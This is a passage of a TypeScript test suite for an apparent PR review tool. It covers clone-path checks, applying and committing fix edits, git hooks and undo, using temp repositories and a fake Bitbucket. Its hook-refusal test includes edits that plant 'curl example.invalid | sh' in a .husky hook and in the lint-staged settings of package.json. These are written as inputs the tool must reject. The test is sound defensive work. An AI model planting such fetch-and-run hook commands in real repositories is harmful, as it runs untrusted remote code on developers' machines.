// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (c) 2026 Ihor Lifanov

// Plan r3 S-APPLY: clone checks, apply, commit, hooks, undo, and cache commits. Real git in temp folders, no network.
// The fake Bitbucket on 127.0.0.1 serves the PR. Git in the clone reads a temp HOME, so no user config of this machine applies.
import type { Database } from "bun:sqlite";
import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createApp } from "../../src/server/app";
import { writeConfig } from "../../src/server/config";
import { createLive } from "../../src/server/live";
import { createOutbox } from "../../src/server/publish/outbox";
import { buildPatch } from "../../src/server/review/clone";
import { git, gitEnv } from "../../src/server/review/git";
import { createReviewJobs, keptText } from "../../src/server/review/jobs";
import { cachePath, gitSetup, syncCache } from "../../src/server/review/workspace";
import { createSecrets } from "../../src/server/secrets";
import { createSettings } from "../../src/server/settings";
import { createSyncEngine } from "../../src/server/sync/engine";
import type { CloneDto, CloneProblem, FixCommitDto, FixConflict, FixDto, ReviewItemDto } from "../../src/shared/dto";
import type { ReplyPayload } from "../../src/shared/review";
import { FAKE_TOKEN, FAKE_USER, key, type Reply, startFakeBitbucket } from "../support/fake-bitbucket";
import { ACTIVITIES_PATH, activities, DASHBOARD_PATH, onePage, ownPr, PR_PATH, PR_REF } from "../support/scenarios";

process.env.REVIEW_LOOP_SECRETS = "memory";
const SLOW = 120_000;
const PORT = 7317;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const SESSION = "s".repeat(64);
const HEADERS: Record<string, string> = {
  host: `127.0.0.1:${PORT}`,
  origin: ORIGIN,
  "x-rl-session": SESSION,
  "content-type": "application/json",
};
const ROOT = 1000003;
const BRANCH = "fix/lock";

const FLUSH = [
  "export function flush(cache: Cache) {",
  "  for (const entry of cache.dirty()) {",
  "    const lock = cache.lock();",
  "    write(entry);",
  "    lock.release();",
  "  }",
  "}",
  "",
].join("\n");
const PACKAGE = `${JSON.stringify({ name: "sample", scripts: { test: "bun test" }, "lint-staged": { "*.ts": "biome check" } }, null, 2)}\n`;
// The edits of the fix run. 1 and 2 belong to thread ROOT. 3 changes the README.
const EDITS = [
  {
    path: "src/flush.ts",
    old: "    write(entry);\n    lock.release();\n",
    new: "    try {\n      write(entry);\n    } finally {\n      lock.release();\n    }\n",
  },
  { path: "docs/flush.md", old: "", new: "Flush order.\n" },
  { path: "README.md", old: "# Sample", new: "# Sample repo" },
];

let root: string;
let remote: string;
let setupEnv: Record<string, string>;
let heads: { base: string; main: string; source: string };
const saved: Record<string, string | undefined> = {};

// A bare remote: main, and the PR source branch fix/lock with one commit.
beforeAll(async () => {
  root = realpathSync.native(mkdtempSync(join(tmpdir(), "rl-apply-")));
  // Git in the clone reads $HOME/.gitconfig. A temp HOME keeps the user config of this machine out.
  const home = join(root, "home");
  mkdirSync(home);
  for (const k of ["HOME", "XDG_CONFIG_HOME"]) saved[k] = process.env[k];
  process.env.HOME = home;
  process.env.XDG_CONFIG_HOME = join(home, ".config");
  writeFileSync(join(root, "empty.gitconfig"), "");
  setupEnv = {
    ...gitEnv(join(root, "empty.gitconfig")),
    GIT_AUTHOR_NAME: "Setup",
    GIT_AUTHOR_EMAIL: "setup@example.invalid",
    GIT_COMMITTER_NAME: "Setup",
    GIT_COMMITTER_EMAIL: "setup@example.invalid",
  };
  remote = join(root, "remote.git");
  await git(["init", "-q", "--bare", "--template=", remote], { env: setupEnv });
  const base = await commitFiles(
    null,
    { "src/flush.ts": FLUSH.replace("    write(entry);\n", "    write(entry, 0);\n"), "README.md": "# Sample\n", "package.json": PACKAGE },
    "base",
  );
  const main = await commitFiles(base, { "docs/main.md": "main\n" }, "main moves");
  const source = await commitFiles(base, { "src/flush.ts": FLUSH }, "Lock each entry");
  await rg(["update-ref", "refs/heads/main", main]);
  await rg(["update-ref", `refs/heads/${BRANCH}`, source]);
  await rg(["update-ref", "refs/pull-requests/2/from", source]);
  heads = { base, main, source };
});

afterAll(() => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  rmSync(root, { recursive: true, force: true, maxRetries: 3 });
});

const cleanup: (() => unknown)[] = [];
afterEach(async () => {
  for (const f of cleanup.splice(0).reverse()) await f();
});

const rg = async (args: string[], stdin?: string) => (await git(["--git-dir", remote, ...args], { env: setupEnv, stdin })).trim();
let blobs = 0;
async function commitFiles(parent: string | null, files: Record<string, string>, msg: string) {
  const index = join(root, `setup-${blobs++}.index`);
  const env = { ...setupEnv, GIT_INDEX_FILE: index };
  const g = async (args: string[], stdin?: string) => (await git(["--git-dir", remote, ...args], { env, stdin })).trim();
  await g(parent ? ["read-tree", parent] : ["read-tree", "--empty"]);
  for (const [path, text] of Object.entries(files)) {
    const sha = await g(["hash-object", "-w", "--no-filters", "--stdin"], text);
    await g(["update-index", "--add", "--cacheinfo", `100644,${sha},${path}`]);
  }
  return g(["commit-tree", await g(["write-tree"]), ...(parent ? ["-p", parent] : []), "-m", msg]);
}

// Read-only checks and test setup in a clone. The isolated env ignores the temp HOME too.
const cg = async (path: string, args: string[], stdin?: string) => (await git(["-C", path, ...args], { env: setupEnv, stdin })).trim();

let clones = 0;
// A clone of the remote on fix/lock. The clone config holds the identity. autocrlf: the line ending setting at checkout.
async function makeClone(o: { autocrlf?: boolean; args?: string[]; branch?: string } = {}) {
  const path = join(root, "clones", `c${clones++}`);
  mkdirSync(join(root, "clones"), { recursive: true });
  const crlf = o.autocrlf ? "true" : "false";
  await git(["-c", `core.autocrlf=${crlf}`, "clone", "-q", ...(o.args ?? ["--branch", BRANCH]), remote, path], { env: setupEnv });
  const config: [string, string][] = [
    ["user.name", "Clone User"],
    ["user.email", "clone@example.test"],
    ["core.autocrlf", crlf],
    ["commit.gpgsign", "false"],
  ];
  for (const [k, v] of config) await cg(path, ["config", k, v]);
  if (o.branch) await cg(path, ["checkout", "-q", "-b", o.branch]);
  return realpathSync.native(path);
}

const HOOK = (body: string) => `#!/bin/sh\n${body}\n`;
function hook(clone: string, name: string, body: string) {
  const p = join(clone, ".git", "hooks", name);
  mkdirSync(join(clone, ".git", "hooks"), { recursive: true });
  writeFileSync(p, HOOK(body));
  chmodSync(p, 0o755);
}

async function setup() {
  const pr = ownPr() as ReturnType<typeof ownPr> & {
    fromRef: { id: string; displayId: string; latestCommit: string };
    toRef: { latestCommit: string };
  };
  Object.assign(pr.fromRef, { id: `refs/heads/${BRANCH}`, displayId: BRANCH, latestCommit: heads.source });
  pr.toRef.latestCommit = heads.main;
  const ok = (body: unknown): Reply => ({ status: 200, body });
  const fake = startFakeBitbucket({
    routes: {
      [key("GET", DASHBOARD_PATH)]: (req) => ok(onePage(new URL(req.url).searchParams.get("role") === "AUTHOR" ? [pr] : [])),
      [key("GET", PR_PATH)]: () => ok(pr),
      [key("GET", ACTIVITIES_PATH)]: () => ok(onePage(activities("activities-nested-reply.json"))),
    },
  });
  const dir = realpathSync.native(mkdtempSync(join(root, "data-")));
  writeConfig(dir, { baseUrl: fake.url, userSlug: FAKE_USER, notifications: false });
  const secrets = createSecrets(null);
  await secrets.set(FAKE_TOKEN);
  const settings = createSettings({ dir, secrets });
  const live = createLive();
  const sync = createSyncEngine({ settings, live });
  const review = createReviewJobs({ settings, live, dataDir: dir, runnerCommand: [process.execPath, "--version"] });
  const outbox = createOutbox({ settings, live });
  // No test opens the OS file manager. opens: the answer of the next calls.
  const folders = { opens: true, paths: [] as string[] };
  const openFolder = async (path: string) => {
    folders.paths.push(path);
    return folders.opens;
  };
  const app = createApp({ port: PORT, token: SESSION, live, settings, sync, review, outbox, openFolder });
  cleanup.push(async () => {
    await outbox.stop();
    sync.stop();
    settings.close();
    fake.stop();
  });
  await sync.syncNow();
  const db = settings.db() as Database;
  const { id } = db.query("SELECT id FROM pull_request WHERE pr_id = $id").get({ id: PR_REF.id }) as { id: number };
  const gitRemote = { url: remote, sourceUrl: remote, sourceRef: `refs/heads/${BRANCH}`, targetRef: "refs/heads/main", fetchConfig: [] };
  await syncCache({ dataDir: dir, pr: { ref: PR_REF, sourceHead: heads.source, targetHead: heads.main }, remote: gitRemote });
  const cache = cachePath(dir, PR_REF);

  const { id: run } = db
    .query(
      `INSERT INTO review_run (pr, kind, profile, note, idem_key, source_head, target_head, status, started_at, finished_at)
      VALUES ($pr, 'fix', 'general', '', 'fix', $s, $t, 'completed', 1, 2) RETURNING id`,
    )
    .get({ pr: id, s: heads.source, t: heads.main }) as { id: number };
  // item: the review_item ID of a finding edit. A finding edit has no thread.
  const edit = (e: { path: string; old: string; new: string }, thread: number | null = ROOT, item: number | null = null) =>
    (
      db
        .query(
          `INSERT INTO fix_edit (run, ord, thread, item, path, old, new, start, rows_json)
          VALUES ($run, 0, $thread, $item, $path, $old, $new, 0, '[]') RETURNING id`,
        )
        .get({ run, thread, item, path: e.path, old: e.old, new: e.new }) as { id: number }
    ).id;
  const ids = EDITS.map((e) => edit(e));
  // An open reply draft of thread ROOT. The commit supersedes it.
  const { id: draft } = db
    .query(
      `INSERT INTO review_item (run, kind, payload_json, body, thread) VALUES ($run, 'reply', $payload, 'Will do.', $thread) RETURNING id`,
    )
    .get({
      run,
      thread: ROOT,
      payload: JSON.stringify({ thread: ROOT, action: "reply", body: "Will do.", reason: "R.", evidenceStatus: "code", replyTo: ROOT }),
    }) as {
    id: number;
  };

  const call = async <T>(method: string, path: string, body?: unknown, headers = HEADERS) => {
    const res = await app.request(`${ORIGIN}${path}`, {
      method,
      headers,
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await res.text();
    let json: unknown = text;
    try {
      json = JSON.parse(text);
    } catch {}
    return { status: res.status, body: json as T };
  };
  const setClone = (path: string) => call<CloneDto & { error?: string }>("PUT", `/api/prs/${id}/clone`, { path });
  const apply = (edits: number[], mode: "clone" | "cache" = "clone", message = "Fix review comment 1000003 on PR 2") =>
    call<FixCommitDto & FixConflict>("POST", `/api/fix-runs/${run}/commit`, { edits, message, mode });
  const undo = (fix: number) => call<FixCommitDto & FixConflict>("POST", `/api/fix-commits/${fix}/undo`);
  const row = (fix: number) =>
    db.query("SELECT * FROM fix_commit WHERE id = $id").get({ id: fix }) as { state: string; commit_hash: string | null };
  const items = () =>
    db.query("SELECT id, status, revision, body, payload_json FROM review_item WHERE kind = 'reply' ORDER BY id").all() as {
      id: number;
      status: string;
      revision: number;
      body: string;
      payload_json: string;
    }[];
  const newest = () =>
    (
      db
        .query(
          "SELECT comment_id FROM comment WHERE pr = $pr AND root_id = $root AND tombstoned_at IS NULL ORDER BY created_at DESC, comment_id DESC LIMIT 1",
        )
        .get({ pr: id, root: ROOT }) as { comment_id: number }
    ).comment_id;
  return { pr, fake, db, id, run, ids, edit, draft, dir, cache, call, setClone, apply, undo, row, items, newest, folders, live };
}

// HEAD and the status, to prove that a refused apply changed nothing.
const snapshot = async (clone: string) => [await cg(clone, ["rev-parse", "HEAD"]), await cg(clone, ["status", "--porcelain"])];

describe("clone path", () => {
  test(
    "PUT refuses a relative path, a subfolder, a folder in the data folder, and a bare repository; DELETE clears the path",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      const inData = join(s.dir, "clone");
      await git(["init", "-q", inData], { env: setupEnv });
      for (const [path, text] of [
        ["relative/clone", "absolute"],
        [join(clone, "src"), "top folder"],
        [inData, "data folder"],
        [remote, "bare"],
        [join(root, "nothing"), "does not exist"],
      ] as const) {
        const r = await s.setClone(path);
        expect(r.status).toBe(400);
        expect(r.body.error).toContain(text);
      }
      const r = await s.setClone(clone);
      expect(r.status).toBe(200);
      expect(r.body).toEqual({ path: clone, problems: [], branch: BRANCH, head: heads.source });
      expect((await s.call<CloneDto>("GET", `/api/prs/${s.id}/clone`)).body.path).toBe(clone);
      expect((await s.call("DELETE", `/api/prs/${s.id}/clone`)).status).toBe(204);
      const gone = await s.call<CloneDto>("GET", `/api/prs/${s.id}/clone`);
      expect(gone.body.problems.map((p) => p.kind)).toEqual(["not_set"]);
      const apply = await s.apply([s.ids[0] as number]);
      expect([apply.status, apply.body.problems?.map((p) => p.kind)]).toEqual([409, ["not_set"]]);
    },
    SLOW,
  );

  test(
    "open-folder opens the stored clone path only, never a path from the request; no file manager gives 501 with the path",
    async () => {
      const s = await setup();
      const open = (id: number, body?: unknown) =>
        s.call<{ error?: string; path?: string }>("POST", `/api/prs/${id}/clone/open-folder`, body);
      expect(await open(s.id)).toEqual({ status: 404, body: { error: "Set the folder of your clone of this repository." } });
      expect((await open(999_999)).status).toBe(404);
      expect(s.folders.paths).toEqual([]);

      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      expect((await s.call("GET", "/api/clones")).body).toEqual([
        { project: PR_REF.project, repo: PR_REF.repo, path: clone, pr: s.id, missing: false },
      ]);
      // A path in the body changes nothing.
      expect((await open(s.id, { path: root })).status).toBe(204);
      expect(s.folders.paths).toEqual([clone]);
      s.folders.opens = false;
      expect(await open(s.id)).toEqual({
        status: 501,
        body: { error: "No file manager opened the folder. Copy the path.", path: clone },
      });
      expect(s.folders.paths).toEqual([clone, clone]);

      // A clone folder that moved: no opener call, and the list marks it.
      rmSync(clone, { recursive: true, force: true, maxRetries: 3 });
      expect(await open(s.id)).toEqual({ status: 409, body: { error: "The clone folder does not exist." } });
      expect(s.folders.paths).toEqual([clone, clone]);
      expect((await s.call<{ missing: boolean }[]>("GET", "/api/clones")).body.map((c) => c.missing)).toEqual([true]);
      expect((await s.call("DELETE", `/api/prs/${s.id}/clone`)).status).toBe(204);
      expect((await s.call("GET", "/api/clones")).body).toEqual([]);
    },
    SLOW,
  );
});

describe("clone checks", () => {
  const cases: [string, (clone: string, s: Awaited<ReturnType<typeof setup>>) => Promise<unknown>, CloneProblem][] = [
    ["detached HEAD", (c) => cg(c, ["checkout", "-q", "--detach"]), "detached"],
    ["another branch", (c) => cg(c, ["checkout", "-q", "-b", "other"]), "branch"],
    ["a tracked edit", async (c) => writeFileSync(join(c, "package.json"), "{}\n"), "dirty"],
    [
      "a staged edit",
      async (c) => {
        writeFileSync(join(c, "new.txt"), "x\n");
        await cg(c, ["add", "new.txt"]);
      },
      "dirty",
    ],
    ["a merge in progress", async (c) => writeFileSync(join(c, ".git", "MERGE_HEAD"), `${heads.main}\n`), "busy"],
    ["no identity", (c) => cg(c, ["config", "--unset", "user.email"]), "identity"],
    [
      "a live head that the clone lacks",
      async (_c, s) => {
        s.pr.fromRef.latestCommit = await commitFiles(heads.source, { "docs/later.md": "later\n" }, "Later");
      },
      "behind",
    ],
    [
      "a live head that is not in the branch",
      async (_c, s) => {
        s.pr.fromRef.latestCommit = heads.main;
      },
      "diverged",
    ],
  ];
  for (const [name, change, kind] of cases)
    test(
      `${name} gives 409 ${kind}, and the clone stays unchanged`,
      async () => {
        const s = await setup();
        const clone = await makeClone();
        expect((await s.setClone(clone)).status).toBe(200);
        await change(clone, s);
        const before = await snapshot(clone);
        const r = await s.apply([s.ids[0] as number]);
        expect(r.status).toBe(409);
        expect(r.body.problems.map((p) => p.kind)).toContain(kind);
        expect(await snapshot(clone)).toEqual(before);
        expect(s.db.query("SELECT COUNT(*) AS n FROM fix_commit").get()).toEqual({ n: 0 });
      },
      SLOW,
    );

  test(
    "a clone without the head of the fix run gives no_base",
    async () => {
      const s = await setup();
      const clone = await makeClone({ args: ["--no-local", "--single-branch", "--branch", "main"], branch: BRANCH });
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply([s.ids[0] as number]);
      expect(r.status).toBe(409);
      expect(r.body.problems.map((p) => p.kind)).toEqual(["no_base", "behind"]);
    },
    SLOW,
  );

  test(
    "untracked files and a local commit ahead are allowed",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      writeFileSync(join(clone, "notes.txt"), "untracked\n");
      writeFileSync(join(clone, "docs-local.md"), "local\n");
      await cg(clone, ["add", "docs-local.md"]);
      await cg(clone, ["commit", "-q", "-m", "Local commit"]);
      const ahead = await cg(clone, ["rev-parse", "HEAD"]);
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply([s.ids[0] as number]);
      expect(r.status).toBe(201);
      expect(r.body.before).toBe(ahead);
      expect(await cg(clone, ["rev-parse", "HEAD^"])).toBe(ahead);
      expect(await cg(clone, ["status", "--porcelain"])).toBe("?? notes.txt");
    },
    SLOW,
  );
});

describe("apply and commit", () => {
  test(
    "one commit on the branch with parent before, only the patch paths, the clone identity, and a Fixed in draft",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply(s.ids);
      expect(r.status).toBe(201);
      const head = await cg(clone, ["rev-parse", "HEAD"]);
      expect(r.body).toMatchObject({ mode: "clone", state: "committed", branch: BRANCH, before: heads.source, commit: head, fetch: null });
      expect(r.body.edits).toEqual(s.ids);
      expect(r.body.short).toBe(await cg(clone, ["rev-parse", "--short", "HEAD"]));
      expect(await cg(clone, ["rev-parse", "HEAD^"])).toBe(heads.source);
      expect(await cg(clone, ["rev-list", "--count", `${heads.source}..HEAD`])).toBe("1");
      expect((await cg(clone, ["diff-tree", "--no-commit-id", "--name-only", "-r", "HEAD"])).split("\n")).toEqual([
        "README.md",
        "docs/flush.md",
        "src/flush.ts",
      ]);
      expect(await cg(clone, ["log", "-1", "--format=%an <%ae>|%cn|%s"])).toBe(
        "Clone User <clone@example.test>|Clone User|Fix review comment 1000003 on PR 2",
      );
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
      expect(readFileSync(join(clone, "src/flush.ts"), "utf8")).toContain("    } finally {\n");

      const [draft, fixed] = s.items();
      expect(draft).toMatchObject({ id: s.draft, status: "discarded", revision: 1 });
      // thread-outcome.md: the draft keeps the untouched answer. The run has no note reply, so the line names only the commit.
      expect(fixed).toMatchObject({ status: "new", body: `Will do.\n\nFixed in ${r.body.short}.` });
      const payload = JSON.parse(fixed?.payload_json ?? "{}") as ReplyPayload;
      expect(payload).toMatchObject({
        thread: ROOT,
        action: "reply",
        replyTo: s.newest(),
        fix: { id: r.body.id, commit: head, replaced: [s.draft] },
        threadOpen: true,
      });
    },
    SLOW,
  );

  test(
    "a subset gives only its hunks; the same POST again returns the same row",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const one = [s.ids[2] as number];
      const r = await s.apply(one);
      expect(r.status).toBe(201);
      expect(await cg(clone, ["diff-tree", "--no-commit-id", "--name-only", "-r", "HEAD"])).toBe("README.md");
      const again = await s.apply(one);
      expect(again.status).toBe(200);
      expect(again.body).toEqual(r.body);
      expect(await cg(clone, ["rev-list", "--count", `${heads.source}..HEAD`])).toBe("1");
    },
    SLOW,
  );

  test(
    "a conflict with a local commit gives 409 patch; HEAD and the status stay",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      writeFileSync(join(clone, "src/flush.ts"), FLUSH.replace("    lock.release();\n", "    lock.free();\n"));
      await cg(clone, ["commit", "-q", "-am", "Local change"]);
      expect((await s.setClone(clone)).status).toBe(200);
      const before = await snapshot(clone);
      const r = await s.apply([s.ids[0] as number]);
      expect(r.status).toBe(409);
      expect(r.body.problems.map((p) => p.kind)).toEqual(["patch"]);
      expect(await snapshot(clone)).toEqual(before);
      expect(s.db.query("SELECT COUNT(*) AS n FROM fix_commit").get()).toEqual({ n: 0 });
    },
    SLOW,
  );

  test(
    "core.autocrlf=true on an LF repository: the apply works and the committed blobs equal the blobs of T",
    async () => {
      const s = await setup();
      const clone = await makeClone({ autocrlf: true });
      expect(readFileSync(join(clone, "src/flush.ts"), "utf8")).toContain("\r\n");
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply(s.ids);
      expect(r.status).toBe(201);
      const edits = EDITS.map((e, i) => ({ ...e, id: s.ids[i] as number }));
      const patch = await buildPatch(s.cache, gitSetup(s.dir).env, heads.source, edits);
      if ("error" in patch) throw new Error(patch.error);
      for (const path of ["src/flush.ts", "docs/flush.md", "README.md"])
        expect(await cg(clone, ["rev-parse", `HEAD:${path}`])).toBe(
          (await git([`--git-dir=${s.cache}`, "rev-parse", `${patch.tree}:${path}`], { env: setupEnv })).trim(),
        );
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
    },
    SLOW,
  );

  test(
    "a patch file with a new time and the same content applies, and Undo resets over it",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const file = join(clone, "src/flush.ts");
      const old = new Date("2020-01-01T00:00:00Z");
      utimesSync(file, old, old);
      const r = await s.apply([s.ids[0] as number]);
      expect(r.status).toBe(201);
      expect(await cg(clone, ["rev-parse", "HEAD^"])).toBe(heads.source);
      // `reset --keep` refuses a file that is "not uptodate" in the index file.
      utimesSync(file, old, old);
      const u = await s.undo(r.body.id);
      expect([u.status, u.body.state]).toEqual([200, "undone"]);
      expect(await cg(clone, ["rev-parse", "HEAD"])).toBe(heads.source);
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
    },
    SLOW,
  );

  test(
    "GIT_DIR and GIT_WORK_TREE in the app env change nothing",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      const other = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const keep = { dir: process.env.GIT_DIR, tree: process.env.GIT_WORK_TREE };
      process.env.GIT_DIR = join(other, ".git");
      process.env.GIT_WORK_TREE = other;
      try {
        expect((await s.apply([s.ids[2] as number])).status).toBe(201);
      } finally {
        if (keep.dir === undefined) delete process.env.GIT_DIR;
        else process.env.GIT_DIR = keep.dir;
        if (keep.tree === undefined) delete process.env.GIT_WORK_TREE;
        else process.env.GIT_WORK_TREE = keep.tree;
      }
      expect(await cg(clone, ["rev-parse", "HEAD^"])).toBe(heads.source);
      expect(await cg(other, ["rev-parse", "HEAD"])).toBe(heads.source);
      expect(await cg(other, ["status", "--porcelain"])).toBe("");
    },
    SLOW,
  );
});

describe("hooks", () => {
  test(
    "pre-commit, prepare-commit-msg, commit-msg, and post-commit run once each",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      const canary = join(root, `canary-${clones}.txt`).replaceAll("\\", "/");
      for (const name of ["pre-commit", "prepare-commit-msg", "commit-msg", "post-commit"])
        hook(clone, name, `echo ${name} >> "${canary}"`);
      expect((await s.setClone(clone)).status).toBe(200);
      expect((await s.apply([s.ids[0] as number])).status).toBe(201);
      expect(readFileSync(canary, "utf8").split("\n").filter(Boolean).sort()).toEqual([
        "commit-msg",
        "post-commit",
        "pre-commit",
        "prepare-commit-msg",
      ]);
    },
    SLOW,
  );

  test(
    "a failing commit-msg hook leaves the edits staged with its stderr; Undo restores the index and the files",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      hook(clone, "commit-msg", 'echo "COMMIT-MSG-REFUSES" >&2\nexit 1');
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply(s.ids);
      expect(r.status).toBe(409);
      expect(r.body.error).toContain("COMMIT-MSG-REFUSES");
      expect(r.body.error).toContain("stay staged");
      const fix = s.db.query("SELECT id, state FROM fix_commit").get() as { id: number; state: string };
      expect(fix.state).toBe("staged");
      expect(await cg(clone, ["rev-parse", "HEAD"])).toBe(heads.source);
      expect((await cg(clone, ["diff", "--cached", "--name-only"])).split("\n")).toEqual(["README.md", "docs/flush.md", "src/flush.ts"]);
      // The same POST returns the staged row. It does not apply again.
      expect((await s.apply(s.ids)).body).toMatchObject({ id: fix.id, state: "staged" });

      const u = await s.undo(fix.id);
      expect(u.status).toBe(200);
      expect(u.body.state).toBe("undone");
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
      expect(existsSync(join(clone, "docs/flush.md"))).toBe(false);
      expect(readFileSync(join(clone, "src/flush.ts"), "utf8")).toBe(FLUSH);
    },
    SLOW,
  );

  test(
    "core.autocrlf=true: a status by a git without autocrlf smudges the staged entries; Undo still restores the index and the files",
    async () => {
      const s = await setup();
      const clone = await makeClone({ autocrlf: true });
      hook(clone, "pre-commit", "exit 1");
      expect((await s.setClone(clone)).status).toBe(200);
      expect((await s.apply(s.ids)).status).toBe(409);
      // The entries are racily clean when the index file is not newer than the files.
      const file = join(clone, "src/flush.ts");
      const { atime, mtime } = statSync(file);
      utimesSync(join(clone, ".git", "index"), atime, new Date(mtime.getTime() - 10_000));
      // Without the CRLF conversion the CRLF files differ from the LF blobs, so this status writes size 0 into their entries.
      await cg(clone, ["-c", "core.autocrlf=false", "status", "--porcelain"]);
      expect(await cg(clone, ["ls-files", "--debug", "src/flush.ts"])).toContain("size: 0");
      const fix = (s.db.query("SELECT id FROM fix_commit").get() as { id: number }).id;
      const u = await s.undo(fix);
      expect([u.status, u.body.error ?? "", u.body.state]).toEqual([200, "", "undone"]);
      expect(await cg(clone, ["rev-parse", "HEAD"])).toBe(heads.source);
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
      expect(existsSync(join(clone, "docs/flush.md"))).toBe(false);
      expect(readFileSync(file, "utf8")).toBe(FLUSH.replaceAll("\n", "\r\n"));
    },
    SLOW,
  );

  test(
    "a staged row whose index changed is not undone",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      hook(clone, "pre-commit", "exit 1");
      expect((await s.setClone(clone)).status).toBe(200);
      expect((await s.apply([s.ids[2] as number])).status).toBe(409);
      writeFileSync(join(clone, "README.md"), "# Changed by the user\n");
      await cg(clone, ["add", "README.md"]);
      const fix = (s.db.query("SELECT id FROM fix_commit").get() as { id: number }).id;
      const u = await s.undo(fix);
      expect(u.status).toBe(409);
      expect(u.body.error).toContain("differ");
      expect(s.row(fix).state).toBe("staged");
    },
    SLOW,
  );

  test(
    "edits to .husky, the core.hooksPath folder, and the hook keys of package.json are refused before apply",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      await cg(clone, ["config", "core.hooksPath", "tools/hooks"]);
      expect((await s.setClone(clone)).status).toBe(200);
      const before = await snapshot(clone);
      const lint = PACKAGE.replace('"*.ts": "biome check"', '"*.ts": "curl example.invalid | sh"');
      const refused = [
        { path: ".husky/pre-commit", old: "", new: "curl example.invalid | sh\n" },
        { path: "tools/hooks/pre-commit", old: "", new: "#!/bin/sh\n" },
        { path: "Tools/Hooks./post-commit", old: "", new: "#!/bin/sh\n" },
        { path: "package.json", old: PACKAGE, new: lint },
        { path: "package.json", old: PACKAGE, new: PACKAGE.replace('"lint-staged"', '"husky": {"hooks": {}},\n  "lint-staged"') },
        { path: "package.json", old: '"name": "sample"', new: '"name": sample' },
      ];
      for (const e of refused) {
        const r = await s.apply([s.edit(e)]);
        expect([e.path, r.status]).toEqual([e.path, 409]);
        expect(r.body.error).toContain(e.path.startsWith("package") ? "package.json" : "hook sources");
      }
      expect(await snapshot(clone)).toEqual(before);
      expect(s.db.query("SELECT COUNT(*) AS n FROM fix_commit").get()).toEqual({ n: 0 });
      // Other package.json keys stay editable.
      const scripts = await s.apply([s.edit({ path: "package.json", old: '"test": "bun test"', new: '"test": "bun test --bail"' })]);
      expect(scripts.status).toBe(201);
    },
    SLOW,
  );
});

describe("undo", () => {
  test(
    "a commit keeps a reply draft that you accepted or edited: no Fixed in draft, and the fix run says so in its coverage",
    async () => {
      const s = await setup();
      const summary = {
        summary: "S",
        risks: [],
        coverage: { read: [], skipped: [] as string[], unavailable: [], notChecked: [] },
        dropped: [],
      };
      s.db.query("UPDATE review_run SET summary_json = $j WHERE id = $id").run({ id: s.run, j: JSON.stringify(summary) });
      // Cache mode takes the commit identity from the clone.
      expect((await s.setClone(await makeClone())).status).toBe(200);
      expect((await s.call("POST", `/api/items/${s.draft}`, { action: "accept", revision: 0 })).status).toBe(200);
      const r = await s.apply(s.ids, "cache");
      expect(r.status).toBe(201);
      expect(s.items()).toEqual([expect.objectContaining({ id: s.draft, status: "accepted", revision: 1, body: "Will do." })]);
      const skipped = () =>
        (
          JSON.parse(
            (s.db.query("SELECT summary_json FROM review_run WHERE id = $id").get({ id: s.run }) as { summary_json: string }).summary_json,
          ) as typeof summary
        ).coverage.skipped;
      expect(skipped()).toEqual([keptText(ROOT)]);
      // Undo brings nothing back: the commit replaced no draft. A second commit adds no second line.
      expect((await s.undo(r.body.id)).body.state).toBe("undone");
      expect(s.items()).toEqual([expect.objectContaining({ id: s.draft, status: "accepted" })]);
      expect((await s.apply(s.ids, "cache")).status).toBe(201);
      expect(skipped()).toEqual([keptText(ROOT)]);
    },
    SLOW,
  );

  test(
    "a moved HEAD or a commit on the PR gives 409; else HEAD returns to before and the Fixed in draft is discarded",
    async () => {
      const s = await setup();
      const clone = await makeClone();
      expect((await s.setClone(clone)).status).toBe(200);
      const r = await s.apply(s.ids);
      expect(r.status).toBe(201);

      await cg(clone, ["commit", "-q", "--allow-empty", "-m", "Later"]);
      const moved = await s.undo(r.body.id);
      expect([moved.status, moved.body.error]).toEqual([409, "The clone HEAD moved since the fix commit. Undo it in your clone."]);
      await cg(clone, ["reset", "-q", "--keep", "HEAD^"]);

      s.db
        .query("INSERT INTO pr_commit (pr, hash, ord, message, author_name, ts) VALUES ($pr, $hash, 0, 'm', 'a', 1)")
        .run({ pr: s.id, hash: r.body.commit });
      const pushed = await s.undo(r.body.id);
      expect([pushed.status, pushed.body.error]).toEqual([409, "The commit is on the pull request already. Revert it in your clone."]);
      s.db.query("DELETE FROM pr_commit").run();

      const u = await s.undo(r.body.id);
      expect(u.status).toBe(200);
      expect(u.body.state).toBe("undone");
      expect(await cg(clone, ["rev-parse", "HEAD"])).toBe(heads.source);
      expect(await cg(clone, ["status", "--porcelain"])).toBe("");
      expect(existsSync(join(clone, "docs/flush.md"))).toBe(false);
      const fixed = s.items().at(-1);
